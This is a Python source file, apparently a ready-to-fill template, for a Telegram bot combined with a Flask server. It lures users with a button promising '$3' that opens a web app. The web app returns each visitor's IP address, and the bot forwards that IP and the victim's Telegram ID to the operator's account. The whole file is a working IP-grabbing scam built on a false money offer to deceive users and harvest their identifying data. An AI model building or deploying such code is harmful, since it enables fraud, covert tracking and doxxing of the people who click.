from flask import Flask, send_from_directory
from aiogram import Bot, Dispatcher, Router
from aiogram.types import Message, KeyboardButton, WebAppInfo, ReplyKeyboardMarkup
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types.message import ContentType
import threading
import asyncio
import json

app = Flask(__name__)

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

TOKEN = "1488" #token BF
TARGET_USER_ID = 1 #твой id

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)
@router.message(Command(commands=["start"]))
async def start_handler(message: Message):
    web_app = WebAppInfo(url="https://studentki.com") #ссылка с https
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Получить 3$", web_app=web_app)],
        ],
        resize_keyboard=True
    )
    await message.answer("Получи 3$ по кнопке ниже", reply_markup=keyboard)

@router.message(lambda message: message.content_type == ContentType.WEB_APP_DATA)
async def web_app_data_handler(message: Message):
    ip_data = json.loads(message.web_app_data.data)
    ip_address = ip_data.get("web_app_ip")
    user_id = message.from_user.id
    formatted_message = f"Получен новый IP\n├ID: {user_id}\n└IP: {ip_address}"
    await bot.send_message(chat_id=TARGET_USER_ID, text=formatted_message)

def run_flask():
    app.run(port=5000)
async def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    await dp.start_polling(bot)
if __name__ == "__main__":
    asyncio.run(main())
